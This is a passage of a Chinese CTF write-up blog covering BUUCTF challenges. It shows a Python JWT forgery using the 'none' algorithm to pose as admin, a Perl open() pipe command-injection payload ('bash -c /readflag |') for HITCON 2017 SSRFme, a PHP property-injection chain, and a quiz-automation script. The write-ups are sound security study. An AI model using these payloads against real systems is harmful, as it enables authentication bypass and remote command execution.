<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="built_in">str</span> = &#123;</span><br><span class="line">  <span class="string">&quot;secretid&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;wanan&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1650956179</span></span><br><span class="line">&#125;</span><br><span class="line">token = jwt.encode(<span class="built_in">str</span>,algorithm=<span class="string">&#x27;none&#x27;</span>,key=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"><span class="comment">#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IndhbmFuIiwiaWF0IjoxNjUwOTU2MTc5fQ.</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426150915110.png" alt="image-20220426150915110"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426150945778.png" alt="image-20220426150945778"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426151016005.png" alt="image-20220426151016005"></p>
<h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">10.244</span>.<span class="number">80.46</span> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<span class="comment">#$_SERVER是预定义服务器变量的一种,所有$_SERVER开头的都是预定义的服务变量</span></span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<span class="comment">#explode()函数使用一个字符串分割另一个字符串,并返回由字符串组成的数组</span></span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="comment">#使用字符串orange和ip拼起来组成供你使用的沙箱</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);<span class="comment">#计算oprange的md5</span></span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);<span class="comment">#mkdir函数创建目录</span></span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);<span class="comment">#chdir()函数改变当前目录</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));<span class="comment">#shell_exec()通过shell,将完整输出以字符串的方式返回. escapeshelling把字符串转码为可用在shell命令里使用的参数</span></span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);<span class="comment">#pathinfo()函数以数组的形式返回关于文件路径的信息</span></span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));<span class="comment">#str_replace()函数替换字符串中的一些字符.basename()函数返回路径中的文件名部分</span></span><br><span class="line">   <span class="comment">#根据你的文件路径创建文件夹，并移动到其中，准备创建文件。用上面的例子，这里就是帮你创建a/b/文件夹，准备创建c文件</span></span><br><span class="line">	@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="comment">#创建文件，将第一步GET命令得到的结果放入这个文件内。</span></span><br><span class="line">	@<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在perl语言中,open函数存在命令执行漏洞,如果open文件名中存在管道符,就会将文件名直接以命令的形式执行,然后将命令的结果存到与命令相同的文件中.这里调用了GET函数,而GET函数底层嗲用了open函数,所以存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/&amp;filename=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426163255879.png" alt="image-20220426163255879"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file:bash -c /readflag |&amp;filename=bash -c /readflag |</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426163552004.png" alt="image-20220426163552004"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sandbox/230317844a87b41e353b096d0d6a5145/bash -c /readflag |</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426163603975.png" alt="image-20220426163603975"></p>
<h1 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);<span class="comment">#将类引用进来</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"><span class="comment">#new 一个action对象</span></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="comment">#循环properties参数和值</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="comment">#将新new的action的name属性赋值为properties的值</span></span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="comment">#循环完成之后调用run()方法</span></span><br><span class="line">        <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#new一个action对象出入传进来的两个参数</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Action</span>(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可见new了一个对象,这里我们去看看那个对象可new</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426201723418.png" alt="image-20220426201723418"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426201603244.png" alt="image-20220426201603244"></p>
<p>很明显么,只能去new一个TestView对象啊,ListView是一个抽象类不可new.接着就去调用listView的run()方法</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426201850839.png" alt="image-20220426201850839"></p>
<p>接着又调用了this的renderContent()方法</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426203512565.png" alt="image-20220426203512565"></p>
<p>接着就产生了选择,我们去看看哪里可以利用呢.发现在Base.php类中找到了一个evaluateExpression方法</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426204035652.png" alt="image-20220426204035652"></p>
<p>可见可以直接执行了,但是需要传入一个_expression参数,我们去找一个调用链</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426204857764.png" alt="image-20220426204857764"></p>
<p>别忘了我们可以调用一个render***的方法</p>
<p><img src="C:/Users/14980/AppData/Roaming/Typora/typora-user-images/image-20220426204946781.png" alt="image-20220426204946781"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426205512154.png" alt="image-20220426205512154"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426205747353.png" alt="image-20220426205747353"></p>
<p>但是这里在本地执行成功之后,拿去远程执行的时候,却发现无法执行成功,这里的主要原因是我本地使用的5.x的PHP版本,而远程使用的是7.x,这里也可以发现renderTableRow()方法中传入了一个参数,而mothed()却没有传入参数,也就是5.x可以调用,但是7.x却不能,那么我们就要找另一个方法了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426211842076.png" alt="image-20220426211842076"></p>
<p>可以通过下面的renderTableBody间接去调用上面的方法执行,只需要稍微改一下就好</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426212439559.png" alt="image-20220426212439559"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426212511692.png" alt="image-20220426212511692"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426212558444.png" alt="image-20220426212558444"></p>
<h1 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426221350318.png" alt="image-20220426221350318"></p>
<p>py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://197e14f8-3228-4fe2-bd19-c515590399ce.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">match = re.<span class="built_in">compile</span>(<span class="string">r&quot;[0-9]+ [+|-] [0-9]+&quot;</span>)</span><br><span class="line">r = s.get(url)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1020</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="built_in">str</span> = match.findall(r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(eval(str))</span></span><br><span class="line">    data = &#123;<span class="string">&quot;answer&quot;</span> : <span class="built_in">eval</span>(<span class="built_in">str</span>)&#125;</span><br><span class="line">    r = s.post(url, data=data)</span><br><span class="line">    r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">eval</span>(<span class="built_in">str</span>)))</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426225026285.png" alt="image-20220426225026285"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E9%9D%B6%E5%9C%BA/Burp%E9%9D%B6%E5%9C%BA/"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Burp靶场</div></div></a></div><div class="next-post pull-right"><a href="/%E9%9D%B6%E5%9C%BA/BUUCTF(%E4%BA%8C)%20/"><img class="next-cover" src="https://cdn.pixabay.com/photo/2018/08/23/07/35/thunderstorm-3625405_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF(二)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/%E9%9D%B6%E5%9C%BA/BUUCTF(%E4%B8%80)/" title="BUUCTF(一)"><img class="cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-30</div><div class="title">BUUCTF(一)</div></div></a></div><div><a href="/%E9%9D%B6%E5%9C%BA/BUUCTF(%E4%BA%8C)%20/" title="BUUCTF(二)"><img class="cover" src="https://cdn.pixabay.com/photo/2018/08/23/07/35/thunderstorm-3625405_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-30</div><div class="title">BUUCTF(二)</div></div></a></div><div><a href="/%E9%9D%B6%E5%9C%BA/BUUCTF(%E5%9B%9B)%20/" title="BUUCTF(四)"><img class="cover" src="https://cdn.pixabay.com/photo/2016/10/18/21/28/seljalandsfoss-1751463_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-30</div><div class="title">BUUCTF(四)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#rc4%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">rc4模板注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flask%E6%A1%86%E6%9E%B6session%E8%B6%8A%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">flask框架session越权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smarty%E6%A1%86%E6%9E%B6%E7%9A%84ssti"><span class="toc-number">3.</span> <span class="toc-text">smarty框架的ssti</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GKCTF-2021-babycat"><span class="toc-number">4.</span> <span class="toc-text">[GKCTF 2021]babycat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava"><span class="toc-number">5.</span> <span class="toc-text">[网鼎杯 2020 青龙组]filejava</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java"><span class="toc-number">6.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]Think Java</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-number">7.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HITCON-2017-SSRFme"><span class="toc-number">8.</span> <span class="toc-text">[HITCON 2017]SSRFme</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#warmup-php"><span class="toc-number">9.</span> <span class="toc-text">warmup-php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-StrongestMind"><span class="toc-number">10.</span> <span class="toc-text">[GXYCTF2019]StrongestMind</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
      avatar: 'monsterid',
      serverURLs: 'https://valine.wanan.red',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.wanan.red/%E9%9D%B6%E5%9C%BA/BUUCTF(%E4%B8%89)/'
    this.page.identifier = '/%E9%9D%B6%E5%9C%BA/BUUCTF(%E4%B8%89)/'
    this.page.title = 'BUUCTF(三)'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://www-wanan-red.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script>(function(d, w, c) {
    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
    var s = d.createElement('script');
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments);
    };
    s.async = true;
    s.src = 'https://call.chatra.io/chatra.js';
    if (d.head) d.head.appendChild(s);
})(document, window, 'Chatra');

if (true) {
  var chatBtnFn = () => {
    var chatBtn = document.getElementById("chat_btn")
    chatBtn.addEventListener("click", function(){
      Chatra('openChat')
    });
  }
  chatBtnFn()
} else {
  if (false) {
    function chatBtnHide () {
      Chatra('hide')
    }
    function chatBtnShow () {
      Chatra('show')
    }
  }
}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>